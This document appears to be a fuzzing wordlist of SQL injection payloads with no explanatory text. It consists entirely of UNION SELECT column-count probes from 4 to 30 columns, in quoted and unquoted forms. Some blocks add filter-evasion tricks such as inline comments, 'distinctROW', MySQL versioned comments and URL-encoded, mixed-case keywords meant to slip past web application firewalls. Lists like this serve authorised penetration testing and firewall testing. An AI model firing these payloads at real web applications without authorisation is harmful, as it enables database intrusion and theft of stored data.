'+AND+0+UNION+SELECT+1,2,3,4--+-
'+AND+0+UNION+SELECT+1,2,3,4,5--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-
'+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-
+AND+0+UNION+SELECT+1,2,3,4--
+AND+0+UNION+SELECT+1,2,3,4,5--
+AND+0+UNION+SELECT+1,2,3,4,5,6--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--
+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-
'+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--
+And/**/.0union/*%26*/distinctROW+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--
+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-
'+AND+0+/*!50000%55niON*/+/*!50000%53eLeCt*/+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-